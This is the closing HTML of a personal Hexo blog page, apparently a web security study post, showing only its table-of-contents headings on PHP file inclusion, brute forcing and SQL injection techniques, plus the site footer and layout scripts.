class="post-toc-text">reponse</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#php文件包含"><span class="post-toc-text">php文件包含</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#暴力破解-gt-bp-intruder"><span class="post-toc-text">暴力破解-&gt;bp-intruder</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#sql注入"><span class="post-toc-text">sql注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#sql注入之注释"><span class="post-toc-text">sql注入之注释</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#简单的回显注入"><span class="post-toc-text">简单的回显注入</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#基于报错的注入"><span class="post-toc-text">基于报错的注入</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#万能密码"><span class="post-toc-text">万能密码</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#盲注之异或注入"><span class="post-toc-text">盲注之异或注入</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#约束攻击"><span class="post-toc-text">约束攻击</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#insert-into-基于时间的盲注"><span class="post-toc-text">insert into 基于时间的盲注</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#注入之bypass"><span class="post-toc-text">注入之bypass</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#源码泄漏"><span class="post-toc-text">源码泄漏</span></a></li></ol></li></ol>
+			</nav>
+			<div class="post-toc-bar"><div>
+		</div></div></aside>
+	
+
+	</div>
+</div>
+		</div>
+		</main>
+		
+		<!--footer-->
+		<footer>
+	<div class="blog-text-center">
+		<div class="theme-annie-social">
+				
+				
+					<a href="https://github.com/miraitowa" title="Github" target="_blank"><i class="fa fa-github"></i>&nbsp;</a>
+					
+				
+				
+					<a href="https://miraitowa.github.io/about/" title="Email" target="_blank"><i class="fa fa-envelope-o"></i>&nbsp;</a>
+					
+					
+						
+				
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="theme-annie-copyright">
+			
+				&copy; 2018 11 11 - 2019, content by miraitowa. All Rights Reserved.			       	
+			
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="theme-annie-copyright">
+			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.		
+		</div>
+	</div>
+</footer>
+		<!-- <script src="http://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript"></script> -->
+
+<script>
+	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
+</script>
+
+<style>
+	.motto {
+		color: #000000;
+		font-size: 20px;
+		margin: 100px 25% 0;
+		width: 50%;
+		line-height: 1.4;
+		font-family:"KaiTi", "STXingkai", "Source Sans Pro", "Segoe UI", "Lucida Grande", Helvetica, Arial, "Microsoft YaHei", FreeSans, Arimo, "Droid Sans", "wenquanyi micro hei", "Hiragino Sans GB", "Hiragino Sans GB W3", FontAwesome, sans-serif;
+		text-align: center;
+	}
+	@media(max-width: 890px) {
+		.motto {	
+			margin: 100px 10% 0;
+			width: 80%;
+		}
+	}
+	@media(max-width: 890px) {
+		.motto {
+			margin: 100px 5% 0;
+			width: 90%;
+		}
+	}
+</style>
+
+
+	<script src="/js/motto.js"></script>
+	<script type="text/javascript">
+		$(".motto").html(getMingYanContent());
+	</script>	
+
+
+
+
+
+
+
+	<script type="text/javascript" src="/js/toc.js"></script>
+
+
+<script type="text/javascript" src="/js/main.js"></script>
+
+<script type="text/javascript">
+	//generate a random img that pre_name 'from 0 to 110'
+	var random_bg = Math.floor(Math.random() * 109 + 1);
+
+	//var bg = 'url(/img/random/' + random_bg + '.jpg)';		
+	var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';
+
+	$("#header-bg-2").css("background-image", bg);
+</script>
+		
+		<!--back to top-->
+        <style type="text/css">
+	#totop {
+		background: white;
+		border-radius: 50%;
+		position: fixed;
+		right: 5.4%;
+		bottom: 80px;
+		cursor: pointer;
+	}
+	
+	#totop a {
+		color: #474747;
+		background-color: transparent;
+		padding: 10px;
+		text-decoration: none;
+	}
+	
+	@media(max-width:512px) {
+		#totop {
+			display: none;
+			visibility: hidden;
+		}
+	}
+</style>
+
+
+	<div id="totop">
+  		<a href="javascript:;" class="fa fa-arrow-up"></a>
+	</div>
+
+	</body>
+	</html>
+
